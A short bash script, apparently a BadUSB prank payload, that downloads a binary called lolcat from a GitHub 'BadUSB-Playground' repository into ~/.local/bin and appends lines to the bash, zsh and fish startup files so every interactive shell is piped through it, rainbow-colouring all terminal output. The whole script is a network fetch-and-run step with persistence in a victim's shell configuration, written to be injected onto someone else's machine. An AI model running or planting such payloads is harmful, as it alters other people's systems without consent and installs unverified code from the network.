#!/bin/bash

if ! command -v lolcat &> /dev/null; then
    wget -qO "$HOME/.local/bin/lolcat" https://github.com/FalsePhilosopher/BadUSB-Playground/raw/refs/heads/main/Ducky/USBRubberducky/prank/Unix-like/Linux/Painbow/lolcat
    chmod +x "$HOME/.local/bin/lolcat"
fi

echo '
if [[ -t 1 && -z "$LOLBASH" ]]; then
    export LOLBASH=1
    exec bash |& lolcat
fi' >> ~/.bashrc

echo '
if [[ -t 1 && -z "$LOLZSH" ]]; then
  export LOLZSH=1
  exec zsh |& lolcat
fi' >> ~/.zshrc

echo '
if test -t 1; and not set -q LOLFISH
    set -Ux LOLFISH 1
    exec fish |& lolcat; exit
end' >> ~/.config/fish/config.fish

